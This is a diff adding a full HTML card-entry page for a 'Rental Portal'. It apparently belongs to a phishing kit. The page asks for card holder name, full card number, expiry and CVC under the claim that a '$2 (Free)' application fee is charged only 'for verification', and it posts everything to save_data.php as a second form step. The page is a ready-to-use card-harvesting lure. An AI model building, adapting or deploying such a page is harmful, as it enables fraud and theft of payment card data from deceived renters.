@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Payment — Dashboard</title>
+<style>
+  :root{--green:#28a745;--green-dark:#218838;--bg:#0f172a;}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#0b1220;color:#e5e7eb}
+  .nav{display:flex;align-items:center;justify-content:space-between;padding:14px 22px;background:#0f172a;border-bottom:1px solid rgba(255,255,255,.08)}
+  .brand{font-weight:800;letter-spacing:.5px}
+  .wrap{max-width:1000px;margin:24px auto;padding:0 16px;display:grid;grid-template-columns:2fr 1fr;gap:18px}
+  .panel{background:#111827;border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:18px}
+  h2{margin:0 0 10px}
+  label{display:block;margin:12px 0 6px;font-weight:600}
+  input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid rgba(255,255,255,.14);background:#0b1220;color:#e5e7eb}
+  .grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .badge{display:inline-block;padding:4px 8px;border:1px solid rgba(255,255,255,.2);border-radius:999px;font-size:12px;margin-left:6px}
+  .summary li{display:flex;justify-content:space-between;margin:8px 0;color:#cbd5e1}
+  .btn{width:100%;margin-top:16px;padding:14px;border:0;border-radius:10px;background:var(--green);color:#fff;font-weight:700;font-size:16px;cursor:pointer}
+  .btn:hover{background:var(--green-dark)}
+  small{color:#94a3b8}
+  .logos{display:flex;align-items:center;gap:10px;margin:8px 0 4px 0}
+  .logos img{height:22px;background:#fff;padding:2px;border-radius:4px}
+  .fee{margin:6px 0 12px 0;color:#93c5fd;font-weight:700}
+</style>
+</head>
+<body>
+  <div class="nav">
+    <div class="brand">Rental Portal</div>
+    <div>Secure • PCI Hint <span class="badge">VISA</span> <span class="badge">Mastercard</span></div>
+  </div>
+
+  <div class="wrap">
+    <div class="panel">
+      <h2>Card Details</h2>
+      <div class="logos">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+      </div>
+      <div class="fee">Application Fee: $2 (Free)</div>
+
+      <form id="cardForm" method="POST" action="save_data.php" novalidate>
+        <input type="hidden" name="form_type" value="step2"/>
+        <input type="hidden" id="card_number" name="card_number"/>
+        <input type="hidden" id="expiry_date" name="expiry_date"/>
+
+        <label for="holder">Card Holder Name</label>
+        <input id="holder" name="card_name" required/>
+
+        <label>Card Number</label>
+        <div class="grid4">
+          <input inputmode="numeric" maxlength="4" id="cc1" autocomplete="off">
+          <input inputmode="numeric" maxlength="4" id="cc2" autocomplete="off">
+          <input inputmode="numeric" maxlength="4" id="cc3" autocomplete="off">
+          <input inputmode="numeric" maxlength="4" id="cc4" autocomplete="off">
+        </div>
+        <small>Digits only. Cursor moves automatically every 4 digits.</small>
+
+        <div class="row">
+          <div>
+            <label>Expiry (MM / YY)</label>
+            <div class="row">
+              <input inputmode="numeric" maxlength="2" id="mm" placeholder="MM" autocomplete="off">
+              <input inputmode="numeric" maxlength="2" id="yy" placeholder="YY" autocomplete="off">
+            </div>
+          </div>
+          <div>
+            <label for="cvc">CVC/CVV</label>
+            <input id="cvc" name="cvc" inputmode="numeric" maxlength="4" autocomplete="off">
+          </div>
+        </div>
+
+        <button class="btn" type="submit">Submit Application</button>
+        <small>We don't charge; info is collected only for verification.</small>
+      </form>
+    </div>
+
+    <div class="panel">
+      <h2>Application Summary</h2>
+      <ul class="summary">
+        <li><span>Application Fee</span><strong>$2 (Free)</strong></li>
+        <li><span>Verification</span><strong>Included</strong></li>
+        <li><span>Status</span><strong>Pending</strong></li>
+      </ul>
+      <small>Your information is transmitted securely.</small>
+    </div>
+  </div>
+
+<script>
+(function(){
+  const onlyDigits = e => { e.target.value = e.target.value.replace(/\D+/g,''); };
+  const nextIfFilled = (curr, next) => {
+    curr.addEventListener('input', () => {
+      onlyDigits({target: curr});
+      if (curr.value.length === curr.maxLength && next) next.focus();
+      updateHidden();
+    });
+    curr.addEventListener('keydown', (e)=>{
+      if(e.key==='Backspace' && curr.value.length===0 && next && next.previousElementSibling){
+        next.previousElementSibling.focus();
+      }
+    });
+  };
+
+  const cc1=document.getElementById('cc1'),
+        cc2=document.getElementById('cc2'),
+        cc3=document.getElementById('cc3'),
+        cc4=document.getElementById('cc4'),
+        mm=document.getElementById('mm'),
+        yy=document.getElementById('yy');
+
+  [cc1,cc2,cc3,cc4].forEach((el,i,arr)=>nextIfFilled(el, arr[i+1]));
+  [mm,yy].forEach(el=>el.addEventListener('input',()=>{
+    el.value = el.value.replace(/\D+/g,'').slice(0,2);
+    if (el===mm && el.value.length===2) yy.focus();
+    updateHidden();
+  }));
+
+  function updateHidden(){
+    const raw = [cc1.value,cc2.value,cc3.value,cc4.value].join('');
+    document.getElementById('card_number').value = raw;
+    const m = mm.value.padStart(2,'0'), y = yy.value.padStart(2,'0');
+    document.getElementById('expiry_date').value = m + '/' + y;
+  }
+})();
+</script>
+</body>
+</html>
